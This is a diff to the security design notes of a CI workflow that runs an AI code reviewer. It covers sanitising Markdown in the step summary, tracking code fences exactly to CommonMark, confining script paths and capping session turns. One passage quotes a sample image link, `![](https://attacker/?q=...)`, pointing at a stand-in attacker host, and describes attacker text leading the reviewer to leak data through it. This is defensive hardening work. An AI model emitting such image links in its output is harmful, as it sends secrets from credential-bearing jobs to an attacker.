@@ -470,8 +470,11 @@ No new dependency, service or runtime is introduced.
    9, 12, 15, 20 and 21 all govern what the reviewer **reads**. This one governs what
    it **publishes**. A step summary renders Markdown, including images, so a report
    that echoes attacker-supplied text can carry `![](https://attacker/?q=...)` which
-   the browser fetches when the page is rendered, with no click and from a
-   credential-bearing job's output. The action's own tests confirm its formatter
+   is fetched when the page is rendered, with no click, carrying whatever the reviewer
+   placed in that URL out of a credential-bearing job. GitHub proxies such images
+   through camo, so the request comes from GitHub's infrastructure rather than a
+   viewer's browser -- that changes who is seen making it, not whether the attacker
+   receives the data. The action's own tests confirm its formatter
    preserves Markdown images.
 
    A committed script therefore reads the execution file the action exposes, extracts
@@ -484,11 +487,37 @@ No new dependency, service or runtime is introduced.
    notice. The step runs on `always()`, so a failed reviewer is visible rather than
    silent.
 
+   Fence tracking follows CommonMark exactly, because an approximation of it is a
+   bypass. An earlier version normalised every fence to three characters, so a
+   four-backtick opening could be "closed" by three and reopened by four: Markdown had
+   left the code block while the scanner still believed it was inside, and everything
+   after was published raw. A closing fence must therefore use the same character, be at
+   least as long as the opening one, and carry nothing but whitespace after it. The
+   scanner is deliberately **strict about openings** and lenient about closings, because
+   failing to recognise an opening merely escapes text that would not have rendered,
+   while inventing one passes rendered content through untouched.
+
    The contract test asserts the neutralised output carries none of those vectors
    **and** that the same checks fire on the raw input, since a sanitiser test that
-   cannot fail proves nothing.
+   cannot fail proves nothing. It also checks the property that actually matters rather
+   than the one that is easy to check: every line CommonMark would *render* must have
+   been sanitised, evaluated against a fence tracker written independently in the test
+   so the subject cannot grade its own work.
 
-23. **The session is bounded in turns.** `--max-turns` caps how long the reviewer may
+23. **Each review-context script confines its own paths.** The three committed scripts
+   take their directories and files from the workflow, which is trusted -- but a value
+   that reaches a file read or write is checked where it is **used**, not where it was
+   set. Each resolves its argument and refuses anything outside the runner area it
+   belongs to: the workspace for the collectors, the runner temporary directory for the
+   publisher's execution file, with an absolute path and an existing parent as the floor
+   when no root applies. The step summary's own path is deliberately **not** pinned to a
+   root: it lives under the runner temporary directory today, but that is an
+   implementation detail, and refusing to publish because the runner moved a file would
+   lose the review over an assumption about its layout. A later edit of the workflow therefore cannot point
+   a collector at `/etc` or the publisher at an arbitrary file, and a static analyser
+   reading these scripts in isolation sees the validation rather than an unchecked path.
+
+24. **The session is bounded in turns.** `--max-turns` caps how long the reviewer may
    iterate. The prompt bound of rule 3 limits what the session starts with; this limits
    what it can accumulate while running.
 
